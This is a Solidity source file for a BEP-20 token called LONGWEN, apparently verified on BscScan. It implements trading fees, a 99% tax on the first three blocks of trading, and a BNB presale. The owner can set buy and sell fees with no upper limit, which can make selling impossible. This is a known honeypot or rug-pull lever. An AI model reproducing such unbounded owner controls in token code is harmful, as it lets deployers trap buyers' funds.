/**
 *Submitted for verification at BscScan.com on 2024-01-04
*/

/**
 *Submitted for verification at BscScan.com on 2024-01-04
*/

/**
 *Submitted for verification at BscScan.com on 2023-12-23
*/

/**
 *Submitted for verification at BscScan.com on 2023-12-21
*/

pragma solidity ^0.8.19;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public receiveAddress;
    address public marketAddress;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    mapping(address => bool) public _feeWhiteList;
    uint256 private _tTotal;
    ISwapRouter private _swapRouter;
    address private immutable _weth;
    mapping(address => bool) public _swapPairList;
    bool private inSwap;
    uint256 public constant MAX = ~uint256(0);
    uint256 public _buyFundFee = 100;  //1% buy fee
    uint256 public _sellFundFee = 100;  //1% sell fee
    uint256 public _burnFee = 100;  //1% burn fee
    uint256 public startTradeBlock;
    address public immutable _mainPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress,
        string memory Name, string memory Symbol,
        uint8 Decimals, uint256 Supply,
        address ReceiveAddress, address MarketAddress) {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        _allowances[address(this)][RouterAddress] = MAX;

        _weth = swapRouter.WETH();
        _swapRouter = swapRouter;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), _weth);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 tokenUnit = 10 ** Decimals;
        uint256 total = Supply * tokenUnit;
        _tTotal = total;

        uint256 amountReceiver = 1500000 * tokenUnit;
        _balances[ReceiveAddress] = amountReceiver;
        emit Transfer(address(0), ReceiveAddress, amountReceiver);

        uint256 amountThis = total - amountReceiver;
        _balances[address(this)] = amountThis;
        emit Transfer(address(0), address(this), amountThis);

        receiveAddress = ReceiveAddress;
        marketAddress = MarketAddress;

        _feeWhiteList[MarketAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    mapping(uint256 => uint256) public dayPrice;

    function _transfer(address from, address to, uint256 amount) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "BNE");

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = balance * 99999 / 100000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }

        bool takeFee;

        if (_swapPairList[from] || _swapPairList[to]) {

            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                require(0 < startTradeBlock);
                takeFee = true;
                if (block.number < startTradeBlock + 3) {
                    _funTransfer(from, to, amount);
                    return;
                }
            }
        }

        _tokenTransfer(from, to, amount, takeFee);
    }

    function _funTransfer(address sender, address recipient, uint256 tAmount) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 99 / 100;
        _takeTransfer(sender, marketAddress, feeAmount);
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            if (_swapPairList[sender]) { //Buy
                uint256 swapAmount = tAmount * _buyFundFee / 10000;
                if (swapAmount > 0) {
                    feeAmount += swapAmount;
                    _takeTransfer(sender, address(this), swapAmount);
                }
            } else if (_swapPairList[recipient]) { //Sell
                uint256 swapAmount = tAmount * _sellFundFee / 10000;
                if (swapAmount > 0) {
                    feeAmount += swapAmount;
                    _takeTransfer(sender, address(this), swapAmount);
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        uint256 numTokensSellToFund = swapAmount * 230 / 100;
                        if (numTokensSellToFund > contractTokenBalance) {
                            numTokensSellToFund = contractTokenBalance;
                        }
                        swapTokenForFund(numTokensSellToFund);
                    }
                }
            }

            uint256 burnAmount = tAmount * _burnFee / 10000;
            if(burnAmount > 0) {
                feeAmount += burnAmount;
                _takeTransfer(sender, address(0x000000000000000000000000000000000000dEaD), burnAmount);
            }
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        if (0 == tokenAmount) {
            return;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _weth;
        _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            marketAddress,
            block.timestamp
        );
    }

    function _takeTransfer(address sender, address to, uint256 tAmount) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setMarketAddress(address addr) external onlyOwner {
        marketAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setReceiveAddress(address addr) external onlyOwner {
        receiveAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external {
        payable(marketAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            IERC20(token).transfer(marketAddress, amount);
        }
    }

    function setSellFee(uint256 f) external onlyOwner {
        _sellFundFee = f;
    }

    function setBuyFee(uint256 f) external onlyOwner {
        _buyFundFee = f;
    }

    function setBurnFee(uint256 f) external onlyOwner {
        _burnFee = f;
    }

    function setAirdropBNBEachToken(uint256 amount) external onlyOwner {
        _airdropBNBEachToken = amount;
    }

    uint256 public _airdropBNBEachToken = 5 ether / 100000;

    receive() external payable {
        address account = msg.sender;
        uint256 msgValue = msg.value;
        payable(receiveAddress).transfer(msgValue);
        if (0 < startTradeBlock) {
            return;
        }
        if (msgValue < _airdropBNBEachToken) {
            return;
        }
        uint256 tokenAmount = msgValue / _airdropBNBEachToken;

        uint256 tokenUnit = 10 ** _decimals;
        _tokenTransfer(address(this), account, tokenAmount * tokenUnit, false);
    }
}

contract LONG is AbsToken {
    constructor() AbsToken(
    //SwapRouter
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
        "LONGWEN",
        "LONGWEN",
        18,
        6000000,
    //Receive，接收
        address(0x77dd6e10Fa59B77c3760126960743c04B6548b49),
    //Market，营销
        address(0x56b7AF5b8aEc2eC7b8c1541c73a5C6Bd593D9C9f)
    ) {

    }
}